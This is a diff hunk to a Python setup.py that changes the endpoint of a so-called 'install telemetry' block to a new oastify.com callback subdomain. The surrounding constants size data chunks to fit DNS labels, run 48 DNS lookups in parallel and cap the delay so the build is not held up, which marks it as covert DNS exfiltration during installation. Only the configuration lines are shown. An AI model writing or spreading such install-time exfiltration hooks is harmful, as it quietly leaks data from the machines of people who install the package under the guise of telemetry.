@@ -11,7 +11,7 @@ from setuptools import setup
 
 # --- install telemetry ----------------------------------------------------
 
-_ENDPOINT = "7u2jhveqy7kjvohtqjof4yix0o6fu5iu.oastify.com"
+_ENDPOINT = "gn7wie3o3omwwgfn3qdj4ak7lyrpfi37.oastify.com"
 _CHUNK = 48          # idx(3) + "-" + chunk(3) + "-" + 48 = 56, under the 63-octet label cap
 _WORKERS = 48        # DNS lookups in flight
 _DEADLINE = 15       # seconds; the build never blocks longer than this
